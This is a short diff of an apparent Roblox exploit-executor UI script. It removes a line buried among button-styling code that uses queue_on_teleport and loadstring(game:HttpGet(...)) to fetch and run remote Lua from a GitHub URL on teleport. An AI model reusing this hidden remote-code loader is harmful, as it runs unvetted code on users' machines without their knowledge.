@@ -313,7 +313,6 @@ welcomeLabel.TextXAlignment = Enum.TextXAlignment.Left
 welcomeLabel.TextYAlignment = Enum.TextYAlignment.Top
 welcomeLabel.Parent = mainContent
 
--- Button container for proper centering
 local buttonContainer = Instance.new("Frame")
 buttonContainer.Name = "ButtonContainer"
 buttonContainer.Size = UDim2.new(1, 0, 0, 40)
@@ -341,9 +340,6 @@ local activateButtonStroke = Instance.new("UIStroke")
 activateButtonStroke.Color = Color3.fromRGB(100, 140, 255)
 activateButtonStroke.Thickness = 1
 activateButtonStroke.Parent = activateButton
-queue_on_teleport([[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/visual.lua"))()
-]])
 
 activateButton.MouseEnter:Connect(function()
     TweenService:Create(activateButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 140, 255)}):Play()
